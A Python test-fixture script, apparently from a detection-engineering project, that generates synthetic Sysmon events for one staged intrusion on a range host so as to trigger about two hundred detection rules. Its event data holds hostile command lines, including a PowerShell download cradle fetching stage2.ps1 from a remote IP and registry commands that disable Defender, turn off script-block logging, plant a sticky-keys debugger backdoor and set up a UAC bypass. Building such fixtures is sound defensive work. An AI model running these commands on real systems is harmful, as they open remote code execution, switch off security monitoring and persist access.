#!/usr/bin/env python3
"""Seed one incident that exercises every rule in the corpus.

seed_apt.py tells one attacker's story end to end. This script has a different
job: it is a regression fixture and a coverage demo, built to fire all 192 rules
-- across every EventID the engine understands (1, 2, 3, 6, 7, 8, 9, 10, 11,
12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25) -- while staying ONE
incident: everything hangs off a single process-tree root, and no gap between
events exceeds the correlation window, so the correlator never splits it in
two.

That means trading realism for coverage. No real intrusion touches IIS, SQL
Server, PsExec, WMI/DCOM, CMSTP, and a phishing macro in the same twenty
minutes. Read this less as "an attacker" and more as "a red-team range built to
walk every technique the detection engineering README talks about" -- which is
exactly why the host is named WKSTN-RANGE-01 rather than a real employee's
machine. The phases, roughly in kill-chain order:

    explorer.exe
      └─ OUTLOOK.EXE                         phishing foothold
          ├─ WINWORD.EXE                     macro drops a script (SYS-051)
          │   └─ cmd.exe                     office spawns a shell (SYS-001)
          └─ mshta.exe                       HTA attachment (SYS-001, SYS-005)
              └─ cmd.exe ("ops")             dispatcher for everything below
                  ├─ encoded / cradle powershell, recon burst (whoami/net/
                  │   nltest/systeminfo), cscript encoded script host
                  ├─ registry tampering: Run key, Defender, IFEO, UAC-bypass
                  │   hijack, PS logging disabled, CLM lockdown removed,
                  │   netsh portproxy
                  ├─ LOLBAS: cmstp, regsvr32 Squiblydoo, certutil (download +
                  │   decode), Start-BitsTransfer, control.exe .cpl
                  ├─ three rundll32 children: bare (C2 + named pipe + beacon +
                  │   injection), comsvcs MiniDump (+ LSASS access), url.dll
                  │   OpenURL (+ child wscript)
                  ├─ masquerading svchost.exe, a PE stamped CALC.EXE staged in
                  │   Temp (SYS-092), a dropped payload.exe (BYOVD driver +
                  │   unmanaged PowerShell + startup persistence)
                  ├─ wmic.exe registering a WMI event consumer
                  ├─ ransomware.exe: shadow-copy deletion, a ransom note, and
                  │   several .locked files
                  ├─ coverage-expansion pass 1: schtasks /create, a service
                  │   pointed at a staged binary, a remote thread into LSASS,
                  │   a firewall allow rule, wevtutil cl, a passworded rar
                  │   archive, InstallUtil against a staged DLL, a remote
                  │   mshta HTA, hh.exe against a staged .chm, a remote MSI,
                  │   a net.exe admin-group add, sc stopping WinDefend,
                  │   sdelete, cipher /w, and RDP enabled via registry
                  │   (SYS-093 through SYS-107)
                  ├─ coverage-expansion pass 2: reg.exe saving the SAM hive,
                  │   procdump against lsass, ntdsutil NTDS.dit extraction,
                  │   mavinject injection, wsl -e, MSBuild against a staged
                  │   project, forfiles against a staged target, a tscon
                  │   session hijack, SharpHound, rclone, Rubeus, a
                  │   PowerShell v2 downgrade, an AMSI-bypass command line,
                  │   bitsadmin /transfer, a COM CLSID hijack, and a
                  │   token-theft tool keyword (SYS-108 through SYS-123)
                  ├─ coverage-expansion pass 3: a hollowed/doppelganged
                  │   process, RawCopy reading a volume directly, a
                  │   timestomped DLL, a DCSync request, and a
                  │   sekurlsa::logonpasswords command line, plus a DNS
                  │   query to a dynamic-DNS domain and a self-deleting
                  │   dropper reusing earlier actors (SYS-124 through
                  │   SYS-131)
                  └─ coverage-expansion pass 4: odbcconf REGSVR proxy exec,
                      mmc loading a staged .msc, a non-browser process
                      writing "Login Data" into Temp (both the process- and
                      path-based credential-DB rules at once), a KeePass
                      .kdbx touched by PowerShell, netstat -ano, a recursive
                      dir /s, tasklist piped through a Defender/SentinelOne
                      grep, a 7-Zip archive with -mhe, a curl -T upload,
                      SharpHound invoked via -CollectionMethod, and
                      Impacket's GetNPUsers.py -- rclone (SYS-143), netsh
                      interface (SYS-138), and net group/nltest (SYS-149)
                      are not repeated here: earlier phases already emit
                      command lines that satisfy those three (SYS-132,
                      SYS-133, SYS-135, SYS-136, SYS-137, SYS-139, SYS-140,
                      SYS-141, SYS-142, SYS-144, SYS-148, SYS-150)
              └─ ftp.exe -s:script -> cmd.exe               (SYS-079)
      ├─ coverage-expansion pass 5: ClickFix/FileFix, direct children of
      │   explorer.exe rather than "ops" -- a decoy CAPTCHA-lure paste, a
      │   bypass+hidden PowerShell cradle, mshta named straight in the Run
      │   dialog, and a second-stage PowerShell that pulls its payload back
      │   out of the clipboard (SYS-151 through SYS-154)
      ├─ coverage-expansion pass 6: a remote-access tool (AnyDesk) dropped
      │   and installed silently rather than double-clicked, a PowerShell
      │   clipboard-hijack pattern (read then overwrite), and Problem Steps
      │   Recorder abused for silent screenshot collection
      │   (SYS-155 through SYS-158)
      ├─ coverage-expansion pass 7: a Discord webhook and a pastebin raw
      │   dead-drop as web-service C2 channels, a broad Documents archive,
      │   and a robocopy mass-mirror of Desktop to a remote share
      │   (SYS-159 through SYS-162)
      ├─ coverage-expansion pass 8: Rubeus pass-the-ticket, Mimikatz
      │   sekurlsa::pth/kerberos::ptt, SharpGPOAbuse, netdom trust with SID
      │   filtering disabled, a silent format /y, and a bulk
      │   Get-ADUser | Disable-ADAccount one-liner (SYS-163 through SYS-168)
      ├─ coverage-expansion pass 9: the marginal, out-of-the-mainstream
      │   ATT&CK gaps -- a staged AWS credentials file, a curl request to
      │   the cloud instance metadata address, a staged SSH private key, a
      │   wmic Win32_Process remote-exec command line, mmc.exe spawning a
      │   shell (MMC20.Application DCOM lateral movement), and a
      │   `docker run --privileged` invocation (SYS-169 through SYS-174)
      ├─ coverage-expansion pass 10: an overwritten sticky-keys binary,
      │   Winlogon/SSP/Active Setup registry persistence, a domain account
      │   creation, a Safe Mode boot, a disabled event-log channel, an ISO
      │   mounted via PowerShell, Mimikatz dumping LSA secrets and forging
      │   a golden ticket, a double-extension file, an autologon password
      │   query, GPP cpassword harvesting, SSH lateral movement with a
      │   private key, Tor, and a fileless .NET-compression archive
      │   (SYS-175 through SYS-190)
      ├─ coverage-expansion pass 11: a Sysmon config reload, a clipboard
      │   capture, and a registry key rename (SYS-191, SYS-195, SYS-196) --
      │   the WMI filter/binding and pipe-connected rules (SYS-192 through
      │   SYS-194) fire off events already seeded earlier for other rules
      ├─ coverage-expansion pass 12: an unsigned DLL side-loaded into "ops"
      │   from Temp, certutil installing a certificate into the Root store,
      │   and a renamed PE run from Downloads disguised as an MSI installer
      │   (SYS-197 through SYS-199)
      ├─ coverage-expansion pass 13: eventvwr.exe auto-elevated outside
      │   Explorer and loading an unsigned DLL, a %windir% environment
      │   hijack, EnableLUA disabled via registry, and a COM
      │   elevation-moniker shell off DllHost.exe -- five real UACME/CMSTP
      │   shapes pulled from EVTX-ATTACK-SAMPLES (SYS-200 through SYS-204)
      ├─ coverage-expansion pass 14: a suspended/hollowed notepad.exe and an
      │   unbacked-memory process-access call, a WerFault crash tied to
      │   EventLog, a renamed PsExec's relay pipes, attrib +h, a
      │   registry-forced PowerShell execution policy and AccessVBOM, a
      │   Downloads-staged metadata masquerade, SharpRDP, a wmiexec-style
      │   ADMIN$ output redirect, lsass and NTDS loading off a remote share,
      │   a registry-added SMB share and NullSessionPipes entry, and a
      │   hex-named C2 pipe -- sixteen real shapes pulled from the
      │   "defense evasion misc" and "lateral movement" EVTX-ATTACK-SAMPLES
      │   gap buckets (SYS-205 through SYS-220)
      ├─ coverage-expansion pass 15: an MSI custom action's temp binary, hh.exe
      │   proxying a shell through a .chm, msxsl.exe, WMIC Squiblytwo, an
      │   MSBuild pre-build-event shell, svchost's DcomLaunch group spawning
      │   cmd.exe, explorer.exe's /root, switch, desktopimgdownldr.exe, a
      │   TreatAs COM-hijack redirect, a raw SAM RID-500 write, osk.exe
      │   spawning a process at the logon screen, a fake pending GPO, a
      │   redirected Startup shell folder, smss.exe spawning a shell,
      │   mimikatz's memssp log file, a KeeThief remote thread into KeePass,
      │   a TeamViewer memory-access dump, an LSA Secrets write, and a
      │   DirectInput keylogger artifact -- nineteen real shapes pulled from
      │   the "Execution", "Persistence", and "Credential Access"
      │   EVTX-ATTACK-SAMPLES gap buckets (SYS-221 through SYS-239)
      ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
      ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
      ├─ w3wp.exe -> cmd.exe, appcmd.exe                     (SYS-088/038/039)
      ├─ sqlservr.exe -> cmd.exe                             (SYS-089)
      ├─ wsmprovhost.exe -> hostname.exe                     (SYS-090)
      └─ lsass.exe             direct SAM write              (SYS-091)

    python scripts/seed_full_coverage.py
"""

from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta, timezone

import httpx

from seed_common import EventFactory, post_events

HOST = "WKSTN-RANGE-01"
USER = "CORP\\redteam.ops"
BASE = datetime.now(timezone.utc) - timedelta(minutes=15)

# Every rule ID the corpus ships today, so main() can report exactly what
# (if anything) did not fire.
EXPECTED_RULES = {
    "SYS-001", "SYS-002", "SYS-003", "SYS-004", "SYS-005", "SYS-006", "SYS-007",
    "SYS-008", "SYS-009", "SYS-010", "SYS-020", "SYS-021", "SYS-030", "SYS-031",
    "SYS-032", "SYS-034", "SYS-035", "SYS-036", "SYS-037", "SYS-038", "SYS-039",
    "SYS-040", "SYS-041", "SYS-050", "SYS-051", "SYS-060", "SYS-070", "SYS-071",
    "SYS-072", "SYS-073", "SYS-074", "SYS-075", "SYS-076", "SYS-077", "SYS-078",
    "SYS-079", "SYS-080", "SYS-081", "SYS-082", "SYS-083", "SYS-084", "SYS-085",
    "SYS-086", "SYS-087", "SYS-088", "SYS-089", "SYS-090", "SYS-091", "SYS-092",
    "SYS-093", "SYS-094", "SYS-095", "SYS-096", "SYS-097", "SYS-098", "SYS-099",
    "SYS-100", "SYS-101", "SYS-102", "SYS-103", "SYS-104", "SYS-105", "SYS-106",
    "SYS-107", "SYS-108", "SYS-109", "SYS-110", "SYS-111", "SYS-112", "SYS-113",
    "SYS-114", "SYS-115", "SYS-116", "SYS-117", "SYS-118", "SYS-119", "SYS-120",
    "SYS-121", "SYS-122", "SYS-123", "SYS-124", "SYS-125", "SYS-126", "SYS-127",
    "SYS-128", "SYS-129", "SYS-130", "SYS-131", "SYS-132", "SYS-133", "SYS-135",
    "SYS-136", "SYS-137", "SYS-138", "SYS-139", "SYS-140", "SYS-141", "SYS-142",
    "SYS-143", "SYS-144", "SYS-148", "SYS-149", "SYS-150", "SYS-151", "SYS-152",
    "SYS-153", "SYS-154", "SYS-155", "SYS-156", "SYS-157", "SYS-158", "SYS-159",
    "SYS-160", "SYS-161", "SYS-162", "SYS-163", "SYS-164", "SYS-165", "SYS-166",
    "SYS-167", "SYS-168", "SYS-169", "SYS-170", "SYS-171", "SYS-172", "SYS-173",
    "SYS-174", "SYS-175", "SYS-176", "SYS-177", "SYS-178", "SYS-179", "SYS-180",
    "SYS-181", "SYS-182", "SYS-183", "SYS-184", "SYS-185", "SYS-186", "SYS-187",
    "SYS-188", "SYS-189", "SYS-190", "SYS-191", "SYS-192", "SYS-193", "SYS-194",
    "SYS-195", "SYS-196", "SYS-197", "SYS-198", "SYS-199", "SYS-200", "SYS-201",
    "SYS-202", "SYS-203", "SYS-204", "SYS-205", "SYS-206", "SYS-207", "SYS-208",
    "SYS-209", "SYS-210", "SYS-211", "SYS-212", "SYS-213", "SYS-214", "SYS-215",
    "SYS-216", "SYS-217", "SYS-218", "SYS-219", "SYS-220", "SYS-221", "SYS-222",
    "SYS-223", "SYS-224", "SYS-225", "SYS-226", "SYS-227", "SYS-228", "SYS-229",
    "SYS-230", "SYS-231", "SYS-232", "SYS-233", "SYS-234", "SYS-235", "SYS-236",
    "SYS-237", "SYS-238", "SYS-239",
}


# at()/proc()/raw_event() moved to seed_common.py, shared with seed_apt.py
# and seed_rw.py -- this script's proc() (with automatic ParentImage lookup
# via a guid->image map, and a per-call `user` override) was the most
# complete of the three copies, and is now EventFactory's implementation.
# Bound as plain names so events() below, which calls them bare throughout,
# did not need to change.
_factory = EventFactory(
    host=HOST,
    user=USER,
    base=BASE,
    logon_id="0x9a41f7",
    default_cwd=r"C:\Users\redteam.ops\Downloads",
)
at = _factory.at
proc = _factory.proc
raw_event = _factory.raw_event


# GUIDs for every actor in the tree. A handful (wmiprvse, PSEXESVC, w3wp,
# sqlservr, wsmprovhost, lsass) are parented directly under root rather than
# under "ops": they represent arrivals from the network (WMI/DCOM, PsExec,
# already-running services) rather than children of the phishing chain, but
# they still share the same root so the correlator keeps everything as one
# incident.
G = {
    "root": "{rng-explorer}",
    "outlook": "{rng-outlook}",
    "word": "{rng-word}",
    "word_cmd": "{rng-word-cmd}",
    "mshta": "{rng-mshta}",
    "ops": "{rng-ops-cmd}",
    "ps_enc": "{rng-ps-enc}",
    "ps_cradle": "{rng-ps-cradle}",
    "whoami": "{rng-whoami}",
    "net": "{rng-net}",
    "nltest": "{rng-nltest}",
    "systeminfo": "{rng-systeminfo}",
    "cscript_enc": "{rng-cscript-enc}",
    "reg_run": "{rng-reg-run}",
    "reg_defender": "{rng-reg-defender}",
    "reg_ifeo": "{rng-reg-ifeo}",
    "ps_uac": "{rng-ps-uac}",
    "reg_pslog": "{rng-reg-pslog}",
    "ps_clm": "{rng-ps-clm}",
    "netsh": "{rng-netsh}",
    "cmstp": "{rng-cmstp}",
    "regsvr32": "{rng-regsvr32}",
    "certutil_dl": "{rng-certutil-dl}",
    "certutil_dec": "{rng-certutil-dec}",
    "bits": "{rng-bits}",
    "cpl": "{rng-cpl}",
    "rundll_bare": "{rng-rundll-bare}",
    "rundll_dump": "{rng-rundll-dump}",
    "rundll_url": "{rng-rundll-url}",
    "wscript_child": "{rng-wscript-child}",
    "svchost_masq": "{rng-svchost-masq}",
    "calc_masq": "{rng-calc-masq}",
    "payload": "{rng-payload}",
    "wmic": "{rng-wmic}",
    "wmiprvse": "{rng-wmiprvse}",
    "ftp": "{rng-ftp}",
    "ftp_cmd": "{rng-ftp-cmd}",
    "psexec": "{rng-psexec}",
    "w3wp": "{rng-w3wp}",
    "w3wp_cmd": "{rng-w3wp-cmd}",
    "appcmd": "{rng-appcmd}",
    "sqlservr": "{rng-sqlservr}",
    "sql_cmd": "{rng-sql-cmd}",
    "wsmprovhost": "{rng-wsmprovhost}",
    "hostname": "{rng-hostname}",
    "lsass": "{rng-lsass}",
    "ransom": "{rng-ransom}",
    # Coverage-expansion pass (SYS-093 through SYS-107).
    "schtasks": "{rng-schtasks}",
    "svc_installer": "{rng-svc-installer}",
    "netsh_fw": "{rng-netsh-fw}",
    "wevtutil": "{rng-wevtutil}",
    "rar_archive": "{rng-rar-archive}",
    "installutil": "{rng-installutil}",
    "mshta_remote": "{rng-mshta-remote}",
    "hh_help": "{rng-hh-help}",
    "msiexec_remote": "{rng-msiexec-remote}",
    "net_admin": "{rng-net-admin}",
    "sc_stop": "{rng-sc-stop}",
    "sdelete": "{rng-sdelete}",
    "cipher_wipe": "{rng-cipher-wipe}",
    "reg_rdp": "{rng-reg-rdp}",
    # Coverage-expansion pass 2 (SYS-108 through SYS-123).
    "reg_hive_dump": "{rng-reg-hive-dump}",
    "procdump": "{rng-procdump}",
    "ntdsutil": "{rng-ntdsutil}",
    "mavinject": "{rng-mavinject}",
    "wsl": "{rng-wsl}",
    "msbuild": "{rng-msbuild}",
    "forfiles": "{rng-forfiles}",
    "tscon": "{rng-tscon}",
    "sharphound": "{rng-sharphound}",
    "rclone": "{rng-rclone}",
    "rubeus": "{rng-rubeus}",
    "ps_downgrade": "{rng-ps-downgrade}",
    "ps_amsi": "{rng-ps-amsi}",
    "bitsadmin": "{rng-bitsadmin}",
    "com_hijack": "{rng-com-hijack}",
    "juicypotato": "{rng-juicypotato}",
    # Coverage-expansion pass 3 (SYS-124 through SYS-131).
    "hollow_host": "{rng-hollow-host}",
    "rawcopy": "{rng-rawcopy}",
    "timestomp": "{rng-timestomp}",
    "dcsync": "{rng-dcsync}",
    "mimikatz_sekurlsa": "{rng-mimikatz-sekurlsa}",
    # Coverage-expansion pass 4 (SYS-132 through SYS-150).
    "odbcconf": "{rng-odbcconf}",
    "mmc_console": "{rng-mmc-console}",
    "cred_stager": "{rng-cred-stager}",
    "keepass_touch": "{rng-keepass-touch}",
    "netstat_enum": "{rng-netstat-enum}",
    "dir_recurse": "{rng-dir-recurse}",
    "av_discovery": "{rng-av-discovery}",
    "archive_mhe": "{rng-archive-mhe}",
    "curl_upload": "{rng-curl-upload}",
    "sharphound_ps1": "{rng-sharphound-ps1}",
    "asrep_roast": "{rng-asrep-roast}",
    # Coverage-expansion pass 5: ClickFix/FileFix (SYS-151 through SYS-154).
    "clickfix_lure": "{rng-clickfix-lure}",
    "clickfix_bypass": "{rng-clickfix-bypass}",
    "clickfix_mshta": "{rng-clickfix-mshta}",
    "clickfix_clip": "{rng-clickfix-clip}",
    # Coverage-expansion pass 6: RMM abuse + collection gaps (SYS-155..158).
    "rmm_tool": "{rng-rmm-tool}",
    "clip_hijack": "{rng-clip-hijack}",
    "psr_capture": "{rng-psr-capture}",
    # Coverage-expansion pass 7: web-service C2 + data staging (SYS-159..162).
    "webhook_c2": "{rng-webhook-c2}",
    "paste_dropoff": "{rng-paste-dropoff}",
    "archive_staging": "{rng-archive-staging}",
    "robocopy_staging": "{rng-robocopy-staging}",
    # Coverage-expansion pass 8: AD-specific gaps (SYS-163..168).
    "rubeus_ptt": "{rng-rubeus-ptt}",
    "mimikatz_pth": "{rng-mimikatz-pth}",
    "gpo_abuse": "{rng-gpo-abuse}",
    "trust_sidhistory": "{rng-trust-sidhistory}",
    "destructive_wipe": "{rng-destructive-wipe}",
    "bulk_disable": "{rng-bulk-disable}",
    # Coverage-expansion pass 9: marginal ATT&CK gaps -- cloud, SSH, WMI,
    # DCOM, containers (SYS-169..174).
    "cloud_cred_staged": "{rng-cloud-cred-staged}",
    "imds_theft": "{rng-imds-theft}",
    "ssh_key_staged": "{rng-ssh-key-staged}",
    "wmi_remote_exec": "{rng-wmi-remote-exec}",
    "dcom_mmc": "{rng-dcom-mmc}",
    "docker_privileged": "{rng-docker-privileged}",
    # Coverage-expansion pass 10 (SYS-175..190).
    "accessibility_replace": "{rng-accessibility-replace}",
    "active_setup": "{rng-active-setup}",
    "domain_account": "{rng-domain-account}",
    "safe_mode": "{rng-safe-mode}",
    "eventlog_disable": "{rng-eventlog-disable}",
    "iso_mount": "{rng-iso-mount}",
    "mimikatz_lsasecrets": "{rng-mimikatz-lsasecrets}",
    "mimikatz_golden": "{rng-mimikatz-golden}",
    "double_ext": "{rng-double-ext}",
    "autologon_query": "{rng-autologon-query}",
    "gpp_cpassword": "{rng-gpp-cpassword}",
    "ssh_lateral": "{rng-ssh-lateral}",
    "tor_proxy": "{rng-tor-proxy}",
    "fileless_archive": "{rng-fileless-archive}",
    # Coverage-expansion pass 11 (SYS-191..196). Only one new actor:
    # SYS-192/SYS-193 (WMI filter registered / bound) already fire off the
    # existing raw_event(19, ...)/raw_event(21, ...) pair below the WMI
    # consumer block, and SYS-194 (pipe connected) already fires off the
    # existing raw_event(18, ...) pairs next to rundll_bare and psexec's
    # PipeCreated events -- none of those needed a new rule ID added here
    # until the rules themselves existed. SYS-191 (Sysmon config change) has
    # no process actor by design (see raw_event's docstring on ProcessGuid).
    "reg_rename": "{rng-reg-rename}",
    # Coverage-expansion pass 12 (SYS-197..199). SYS-197 (DLL side-loading)
    # reuses "ops" as the trusted-location loader rather than adding a new
    # actor -- the ImageLoad event just needs a ProcessGuid whose Image is
    # already under System32, which "ops" (cmd.exe) already is.
    "certutil_addstore": "{rng-certutil-addstore}",
    "fake_installer": "{rng-fake-installer}",
    # Coverage-expansion pass 13 (SYS-200..204), field shapes taken from
    # real UACME/CMSTP captures in EVTX-ATTACK-SAMPLES, not synthesized.
    "uac_eventvwr": "{rng-uac-eventvwr}",
    "uac_disable_lua": "{rng-uac-disable-lua}",
    "dllhost_com": "{rng-dllhost-com}",
    "dllhost_shell": "{rng-dllhost-shell}",
    # Coverage-expansion pass 14 (SYS-205..220), field shapes taken from real
    # EVTX-ATTACK-SAMPLES captures across the "defense evasion misc" and
    # "lateral movement" gap buckets. The registry-only rules (SYS-210,
    # SYS-211, SYS-216, SYS-217, SYS-218) have no process actor by design,
    # same as SYS-191/SYS-201 above -- the pipe rules (SYS-208, SYS-219,
    # SYS-220) and the UNC-imageload rule (SYS-215) reuse existing actors
    # ("psexec", "ops", "lsass") rather than adding new ones, since the
    # signature lives entirely in the field values, not in who the actor is.
    "hollow_src": "{rng-hollow-src}",
    "hollow_target": "{rng-hollow-target}",
    "werfault_crash": "{rng-werfault-crash}",
    "attrib_hide": "{rng-attrib-hide}",
    "downloads_herpaderp": "{rng-downloads-herpaderp}",
    "sharprdp_tool": "{rng-sharprdp-tool}",
    "wmi_hidden_share": "{rng-wmi-hidden-share}",
    # Coverage-expansion pass 15 (SYS-221..239), field shapes taken from real
    # EVTX-ATTACK-SAMPLES captures across the "Execution", "Persistence", and
    # "Credential Access" gap buckets. The registry-only rules (SYS-229,
    # SYS-230, SYS-232, SYS-233, SYS-238, SYS-239) and the mimikatz-log rule
    # (SYS-235) reuse existing actors ("lsass", "ops") rather than adding new
    # ones, since the signature lives entirely in the field values.
    "msiexec_installer": "{rng-msiexec-installer}",
    "msi_temp_bin": "{rng-msi-temp-bin}",
    "hh_help": "{rng-hh-help}",
    "hh_shell": "{rng-hh-shell}",
    "msxsl_tool": "{rng-msxsl-tool}",
    "wmic_squibly": "{rng-wmic-squibly}",
    "msbuild_proxy": "{rng-msbuild-proxy}",
    "msbuild_shell": "{rng-msbuild-shell}",
    "svchost_dcomlaunch": "{rng-svchost-dcomlaunch}",
    "dcomlaunch_shell": "{rng-dcomlaunch-shell}",
    "explorer_root": "{rng-explorer-root}",
    "desktopimgdownldr_dl": "{rng-desktopimgdownldr-dl}",
    "osk_tool": "{rng-osk-tool}",
    "osk_child": "{rng-osk-child}",
    "smss_boot": "{rng-smss-boot}",
    "smss_shell": "{rng-smss-shell}",
    "keethief_ps": "{rng-keethief-ps}",
    "keepass_proc": "{rng-keepass-proc}",
    "frida_helper": "{rng-frida-helper}",
    "teamviewer_proc": "{rng-teamviewer-proc}",
    "keylogger_dx": "{rng-keylogger-dx}",
}


def events() -> list[dict]:
    ev: list[dict] = []
    t = 0.0

    def step(n: float = 1.0) -> float:
        nonlocal t
        t += n
        return t

    # --- Foothold: explorer -> Outlook (benign, builds the tree top) ---
    ev.append(proc(step(0), G["root"], "{rng-boot}", r"C:\Windows\explorer.exe",
                    "explorer.exe", pid=3120, ppid=780))
    ev.append(proc(step(2), G["outlook"], G["root"],
                    r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
                    '"OUTLOOK.EXE"', pid=4212, ppid=3120))

    # --- WINWORD.EXE drops a script (SYS-051) then spawns a shell (SYS-001) ---
    ev.append(proc(step(3), G["word"], G["outlook"],
                    r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                    r'"WINWORD.EXE" /n "C:\Users\redteam.ops\Downloads\Invoice_Q3.docm"',
                    pid=4388, ppid=4212,
                    hashes="SHA256=9f2b4a1c8e7d3f6a0b5c9e2d1f4a7b8c"))
    ev.append(raw_event(11, step(1), Image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                         ProcessGuid=G["word"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\dropper.vbs"))
    ev.append(proc(step(1), G["word_cmd"], G["word"], r"C:\Windows\System32\cmd.exe",
                    r'cmd.exe /c cscript.exe //nologo dropper.vbs', pid=4402, ppid=4388,
                    parent_cmdline=r'"WINWORD.EXE" /n "Invoice_Q3.docm"'))

    # --- mshta.exe: second phishing vector, direct child of Outlook (SYS-001 + SYS-005) ---
    ev.append(proc(step(2), G["mshta"], G["outlook"], r"C:\Windows\System32\mshta.exe",
                    r'mshta.exe "C:\Users\redteam.ops\Downloads\Remittance.hta"',
                    pid=4460, ppid=4212))

    # --- "ops": the dispatcher every later branch hangs off ---
    ev.append(proc(step(1), G["ops"], G["mshta"], r"C:\Windows\System32\cmd.exe",
                    "cmd.exe /c start /min", pid=4510, ppid=4460))

    # === Execution / obfuscation ===
    ev.append(proc(step(1), G["ps_enc"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -enc "
                    r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn",
                    pid=4600, ppid=4510))
    ev.append(proc(step(1), G["ps_cradle"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
                    r"DownloadString('http://45.132.192.68/stage2.ps1')\"",
                    pid=4610, ppid=4510))
    ev.append(raw_event(3, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_cradle"], DestinationIp="45.132.192.68",
                         DestinationPort="443", DestinationHostname="cdn-edge-7.telemetry-sync.net"))
    ev.append(raw_event(22, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_cradle"], QueryName="cdn-edge-7.telemetry-sync.net",
                         QueryResults="45.132.192.68"))

    # --- Recon burst under the cradle (4 distinct techniques -> discovery bonus) ---
    ev.append(proc(step(2), G["whoami"], G["ps_cradle"], r"C:\Windows\System32\whoami.exe",
                    "whoami /all", pid=4700, ppid=4610))
    ev.append(proc(step(1), G["net"], G["ps_cradle"], r"C:\Windows\System32\net.exe",
                    'net group "Domain Admins" /domain', pid=4710, ppid=4610))
    ev.append(proc(step(1), G["nltest"], G["ps_cradle"], r"C:\Windows\System32\nltest.exe",
                    "nltest /dclist:corp.local", pid=4720, ppid=4610))
    ev.append(proc(step(1), G["systeminfo"], G["ps_cradle"], r"C:\Windows\System32\systeminfo.exe",
                    "systeminfo", pid=4730, ppid=4610))

    ev.append(proc(step(1), G["cscript_enc"], G["ops"], r"C:\Windows\System32\cscript.exe",
                    r'cscript.exe //B /e:jscript.encode C:\Users\redteam.ops\AppData\Local\Temp\update.jse',
                    pid=4740, ppid=4510))

    # === Persistence / defense evasion (registry) ===
    ev.append(proc(step(1), G["reg_run"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run "
                    r"/v OneDriveSync /t REG_SZ /d C:\Users\redteam.ops\AppData\Roaming\sync.exe /f",
                    pid=4750, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_run"],
                         TargetObject=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync",
                         Details=r"C:\Users\redteam.ops\AppData\Roaming\sync.exe"))

    ev.append(proc(step(1), G["reg_defender"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender "
                    r"/v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f",
                    pid=4760, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_defender"],
                         TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableRealtimeMonitoring",
                         Details="DWORD (0x00000001)"))

    ev.append(proc(step(1), G["reg_ifeo"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution "
                    r"Options\sethc.exe\" /v Debugger /t REG_SZ /d C:\Windows\System32\cmd.exe /f",
                    pid=4770, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_ifeo"],
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",
                         Details=r"C:\Windows\System32\cmd.exe"))

    ev.append(proc(step(1), G["ps_uac"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' "
                    r"-Force; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' "
                    r"-Name '(default)' -Value 'C:\Windows\System32\cmd.exe /c calc.exe'\"",
                    pid=4780, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_uac"],
                         TargetObject=r"HKCU\Software\Classes\ms-settings\shell\open\command\(Default)",
                         Details=r"C:\Windows\System32\cmd.exe /c calc.exe"))

    ev.append(proc(step(1), G["reg_pslog"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging "
                    r"/v EnableScriptBlockLogging /t REG_DWORD /d 0 /f",
                    pid=4790, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_pslog"],
                         TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging",
                         Details="DWORD (0x00000000)"))

    ev.append(proc(step(1), G["ps_clm"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"Remove-ItemProperty -Path "
                    r"'HKLM:\System\CurrentControlSet\Control\SESSION MANAGER\Environment' "
                    r"-Name __PSLockdownPolicy\"",
                    pid=4800, ppid=4510))
    ev.append(raw_event(12, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_clm"], EventType="DeleteValue",
